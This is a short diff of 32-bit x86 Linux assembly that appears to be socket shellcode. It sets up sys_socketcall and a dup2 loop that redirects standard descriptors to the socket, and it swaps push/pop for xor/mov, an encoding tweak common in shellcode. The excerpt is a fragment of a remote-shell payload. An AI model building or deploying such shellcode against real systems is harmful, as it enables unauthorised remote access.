@@ -2,8 +2,8 @@ section .text
 global _start
 
 _start:
-	push 0x66
-	pop eax		; eax = 0x66 (sys_socketcall)
+	xor eax, eax
+	mov al, 0x66	; eax = 0x66 (sys_socketcall)
 	
 	xor ebx, ebx
 	inc ebx		; ebx = 0x1 (SYS_SOCKET)
@@ -57,7 +57,7 @@ _start:
 	xchg ebx, eax	; save the file descriptor in ebx
 
 	xor ecx, ecx	; clear ecx
-	mov cl, 0x2	; loop count
+	mov cl, 0x2	; loop counter
 
 	loop:
 	  mov al, 0x3f	; al = 0x3f (sys_dup2)
